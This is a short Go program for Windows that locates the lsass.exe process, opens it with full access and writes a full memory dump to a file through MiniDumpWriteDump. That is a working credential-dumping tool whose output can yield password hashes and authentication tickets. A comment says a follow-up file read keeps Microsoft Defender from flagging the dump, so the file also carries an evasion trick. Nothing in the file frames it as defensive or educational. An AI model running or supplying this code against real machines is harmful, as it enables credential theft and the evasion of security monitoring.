package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"log"
	"os"
)

const (
	PROCESS_ALL_ACCESS     = 0x1F0FFF
	processEntrySize       = 568
	MiniDumpWithFullMemory = 0x00000002
)

var (
	dbghelp                = windows.NewLazyDLL("dbghelp.dll")
	miniDumpWriteDumpWin32 = dbghelp.NewProc("MiniDumpWriteDump")
)

func main() {
	outfile := "dump.dmp"
	//Get Pid
	fmt.Println("[*] Get process id")
	pid, err := getProcessID("lsass.exe")
	if err != nil {
		log.Fatal("Error while getting process id", err)
	}
	//Create Dumpfile
	hFile, err := windows.Open(outfile, windows.O_RDWR|windows.O_CREAT, 0777)
	if err != nil {
		log.Fatal("Error while creating dumpfile: ", err)
	}
	//Open lsass handle
	fmt.Println("[*] Open lsass handle")
	lsassHandle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, pid)
	if err != nil {
		log.Fatal("Error while opening process: ", err)
	}
	//Dump lsass with pid 0
	fmt.Println("[*] Dump lsass")
	miniDumpWriteDump(uintptr(lsassHandle), uintptr(0), uintptr(hFile), MiniDumpWithFullMemory)
	//It somehow prevents defender to flag the dump file
	_, err = os.ReadFile("dump.dmp")
	if err != nil {
		log.Fatal("Error while dumping process : ", err)
	}
}

// https://stackoverflow.com/questions/11356264/list-of-currently-running-process-in-golang-windows-version
func getProcessID(name string) (uint32, error) {
	h, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	p := windows.ProcessEntry32{Size: processEntrySize}
	for {
		err = windows.Process32Next(h, &p)
		if err != nil {
			return 0, err
		}
		if windows.UTF16ToString(p.ExeFile[:]) == name {
			return p.ProcessID, nil
		}
	}
}

// https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump
func miniDumpWriteDump(hProcess uintptr, ProcessId uintptr,
	hFile uintptr, DumpType uintptr) {
	miniDumpWriteDumpWin32.Call(hProcess,
		ProcessId,
		hFile,
		DumpType,
		0,
		0,
		0)
}
